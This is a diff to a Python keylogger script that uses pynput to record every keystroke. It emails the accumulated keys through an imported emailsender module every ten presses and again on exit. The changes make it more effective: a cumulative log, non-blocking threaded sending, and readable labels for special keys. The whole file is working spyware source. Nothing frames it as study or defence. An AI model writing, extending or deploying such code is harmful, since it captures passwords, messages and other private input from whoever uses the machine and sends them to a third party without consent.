@@ -1,69 +1,71 @@
 import pynput
 from pynput.keyboard import Key, Listener
+import threading  # Import threading for non-blocking email sending
 import emailsender  # Import the emailsender module
 
 count = 0
-keys = []
-
+keys = []       # Stores the latest 10 keystrokes
+all_keys = []   # Stores all keystrokes (keeps growing)
 
 def on_press(key):
-    global keys, count
-    print(key, end=" ")
-    print("pressed")
+    global keys, count, all_keys
+    print(f"{key} pressed")
 
     # Track key presses
-    try:
-        keys.append(str(key))
-    except AttributeError:
-        keys.append(f"{key}")
+    keys.append(key)
+    all_keys.append(key)  # Append to the cumulative list
 
-    count += 2
+    count += 1
 
-    if count > 5:  # Sends an email after 10 keystrokes
-        count = 0
-        email(keys)
+    if count >= 10:  # Every 10 keystrokes
+        count = 0  # Reset count
+        keystrokes_to_send = all_keys.copy()  # Copy all accumulated keys
+        keys.clear()  # Clear only the last 10 keys
 
+        # Send email in a separate thread to prevent blocking
+        threading.Thread(target=email, args=(keystrokes_to_send,)).start()
 
-def email(keys):
+def email(keys_to_send):
+    """Send an email with the logged keystrokes."""
     message = ""
-    for key in keys:
-        k = str(key).replace("'", "")
 
-        # Handle space, enter, tab, backspace, alt, and esc separately
-        if key == Key.space:
-            k = "[SPACE]"
-        elif key == Key.enter:
-            k = "[ENTER]"
-        elif key == Key.tab:
-            k = "[TAB]"
-        elif key == Key.backspace:
-            k = "[BACKSPACE]"
-        elif key == Key.alt:
-            k = "[ALT]"
-        elif key == Key.esc:
-            k = "[ESC]"
-        # For regular alphabetic keys, keep as is
-        elif hasattr(key, 'char') and key.char is not None:
-            k = key.char
+    for key in keys_to_send:
+        if isinstance(key, Key):  # Handle special keys
+            if key == Key.space:
+                message += "[SPACE] "
+            elif key == Key.enter:
+                message += "[ENTER] "
+            elif key == Key.tab:
+                message += "[TAB] "
+            elif key == Key.backspace:
+                message += "[BACKSPACE] "
+            elif key == Key.esc:
+                message += "[ESC] "
+            elif key == Key.shift or key == Key.shift_r:
+                message += "[SHIFT] "
+            elif key == Key.ctrl_l or key == Key.ctrl_r:
+                message += "[CTRL] "
+            elif key == Key.alt or key == Key.alt_gr:
+                message += "[ALT] "
+            else:
+                message += f"[{key}] "  # Generic representation for unhandled keys
         else:
-            k = str(key)  # Handle other special keys
+            message += f"{key} "  # Regular character keys
 
-        message += k + " "  # Add space between keys for better readability
-
-    print(message)
-    emailsender.sendEmail(message)
-
+    if message.strip():  # Avoid sending empty messages
+        print("Sending email:", message)
+        emailsender.sendEmail(message)
 
 def on_release(key):
-    if key == Key.esc:  # Stops the listener when Escape is pressed
+    """Handle key release and send remaining keystrokes on exit."""
+    if key == Key.esc:  # Stop when ESC is pressed
+        if all_keys:  # Send remaining keystrokes before exiting
+            threading.Thread(target=email, args=(all_keys.copy(),)).start()
         return False
 
-
-# Add exception handling for graceful termination
+# Exception handling for safe execution
 try:
     with Listener(on_press=on_press, on_release=on_release) as listener:
         listener.join()
 except KeyboardInterrupt:
     print("Keylogger interrupted and stopped.")
-
-
